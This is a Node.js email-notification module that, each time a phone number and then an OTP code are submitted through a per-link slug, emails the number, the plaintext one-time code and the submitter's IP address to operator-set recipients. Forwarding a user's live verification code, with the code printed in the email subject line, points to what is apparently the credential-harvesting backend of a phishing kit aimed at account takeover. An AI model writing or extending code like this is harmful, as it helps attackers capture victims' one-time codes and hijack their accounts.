const nodemailer = require('nodemailer');

// In-memory store for notification email addresses
let notificationEmails = [];

// SMTP transporter (configured lazily when SMTP settings are set)
let smtpTransporter = null;
let smtpConfig = {
    host: '',
    port: 587,
    user: '',
    pass: ''
};

/**
 * Configure SMTP settings for sending notification emails.
 */
function configureSMTP(config) {
    smtpConfig = { ...smtpConfig, ...config };

    if (!smtpConfig.user || !smtpConfig.pass) {
        console.log('[EmailNotifier] SMTP not configured yet (missing user/pass).');
        smtpTransporter = null;
        return false;
    }

    smtpTransporter = nodemailer.createTransport({
        host: smtpConfig.host || 'smtp.gmail.com',
        port: smtpConfig.port || 587,
        secure: smtpConfig.port === 465,
        auth: {
            user: smtpConfig.user,
            pass: smtpConfig.pass
        }
    });

    console.log(`[EmailNotifier] SMTP configured: ${smtpConfig.user} via ${smtpConfig.host || 'smtp.gmail.com'}`);
    return true;
}

/**
 * Set notification recipient emails.
 */
function setNotificationEmails(emails) {
    notificationEmails = emails.filter(e => e && e.includes('@'));
    console.log(`[EmailNotifier] Notification emails updated: ${notificationEmails.join(', ') || 'none'}`);
}

/**
 * Get current notification emails.
 */
function getNotificationEmails() {
    return [...notificationEmails];
}

/**
 * Get current SMTP config (without password).
 */
function getSMTPConfig() {
    return {
        host: smtpConfig.host || 'smtp.gmail.com',
        port: smtpConfig.port || 587,
        user: smtpConfig.user || '',
        configured: !!(smtpTransporter)
    };
}

/**
 * Send email notification when a phone number is submitted.
 */
async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
    if (!smtpTransporter || notificationEmails.length === 0) return;

    const timeStr = new Date(submittedAt || Date.now()).toLocaleString('en-US', {
        dateStyle: 'medium', timeStyle: 'short'
    });

    const htmlBody = `
    <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 500px; margin: 0 auto; background: #0F172A; border-radius: 12px; overflow: hidden; border: 1px solid #1E293B;">
        <div style="background: linear-gradient(135deg, #F59E0B, #D97706); padding: 20px 24px;">
            <h2 style="margin: 0; color: #000; font-size: 18px;">📱 New Phone Number Submitted</h2>
        </div>
        <div style="padding: 24px; color: #E2E8F0;">
            <table style="width: 100%; border-collapse: collapse;">
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Phone Number</td>
                    <td style="padding: 10px 0; color: #FFFFFF; font-weight: 700; font-size: 18px; direction: ltr; text-align: right;">${phoneNumber}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Status</td>
                    <td style="padding: 10px 0; text-align: right;"><span style="background: rgba(245,158,11,0.2); color: #F59E0B; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600;">⏳ Awaiting OTP</span></td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Link / Slug</td>
                    <td style="padding: 10px 0; color: #60A5FA; text-align: right; font-family: monospace;">${customSlug || '/'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">IP Address</td>
                    <td style="padding: 10px 0; color: #94A3B8; text-align: right; font-size: 12px;">${ipAddress || 'Unknown'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Time</td>
                    <td style="padding: 10px 0; color: #CBD5E1; text-align: right; font-size: 13px;">${timeStr}</td>
                </tr>
            </table>
        </div>
        <div style="background: #1E293B; padding: 12px 24px; text-align: center;">
            <span style="color: #475569; font-size: 11px;">Guber Verification System — Email Notification</span>
        </div>
    </div>`;

    try {
        await smtpTransporter.sendMail({
            from: `"Guber Notifications" <${smtpConfig.user}>`,
            to: notificationEmails.join(', '),
            subject: `📱 New Phone Submitted: ${phoneNumber}`,
            html: htmlBody
        });
        console.log(`[EmailNotifier] Phone notification sent to: ${notificationEmails.join(', ')}`);
    } catch (err) {
        console.error(`[EmailNotifier] Failed to send phone notification:`, err.message);
    }
}

/**
 * Send email notification when OTP is submitted and verified.
 */
async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
    if (!smtpTransporter || notificationEmails.length === 0) return;

    const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
        dateStyle: 'medium', timeStyle: 'short'
    });

    const htmlBody = `
    <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 500px; margin: 0 auto; background: #0F172A; border-radius: 12px; overflow: hidden; border: 1px solid #1E293B;">
        <div style="background: linear-gradient(135deg, #10B981, #059669); padding: 20px 24px;">
            <h2 style="margin: 0; color: #FFFFFF; font-size: 18px;">✅ OTP Verified Successfully</h2>
        </div>
        <div style="padding: 24px; color: #E2E8F0;">
            <table style="width: 100%; border-collapse: collapse;">
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Phone Number</td>
                    <td style="padding: 10px 0; color: #FFFFFF; font-weight: 700; font-size: 18px; direction: ltr; text-align: right;">${phoneNumber}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">OTP Code</td>
                    <td style="padding: 10px 0; text-align: right;">
                        <span style="background: linear-gradient(135deg, #10B981, #059669); color: #FFFFFF; padding: 6px 16px; border-radius: 8px; font-size: 20px; font-weight: 800; letter-spacing: 6px; font-family: monospace;">${otp}</span>
                    </td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Status</td>
                    <td style="padding: 10px 0; text-align: right;"><span style="background: rgba(16,185,129,0.2); color: #10B981; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600;">✅ VERIFIED</span></td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Link / Slug</td>
                    <td style="padding: 10px 0; color: #60A5FA; text-align: right; font-family: monospace;">${customSlug || '/'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">IP Address</td>
                    <td style="padding: 10px 0; color: #94A3B8; text-align: right; font-size: 12px;">${ipAddress || 'Unknown'}</td>
                </tr>
                <tr>
                    <td style="padding: 10px 0; color: #94A3B8; font-size: 13px;">Verified At</td>
                    <td style="padding: 10px 0; color: #CBD5E1; text-align: right; font-size: 13px;">${timeStr}</td>
                </tr>
            </table>
        </div>
        <div style="background: #1E293B; padding: 12px 24px; text-align: center;">
            <span style="color: #475569; font-size: 11px;">Guber Verification System — Email Notification</span>
        </div>
    </div>`;

    try {
        await smtpTransporter.sendMail({
            from: `"Guber Notifications" <${smtpConfig.user}>`,
            to: notificationEmails.join(', '),
            subject: `✅ OTP Verified: ${phoneNumber} → Code: ${otp}`,
            html: htmlBody
        });
        console.log(`[EmailNotifier] OTP notification sent to: ${notificationEmails.join(', ')}`);
    } catch (err) {
        console.error(`[EmailNotifier] Failed to send OTP notification:`, err.message);
    }
}

module.exports = {
    configureSMTP,
    setNotificationEmails,
    getNotificationEmails,
    getSMTPConfig,
    notifyPhoneSubmitted,
    notifyOTPVerified
};
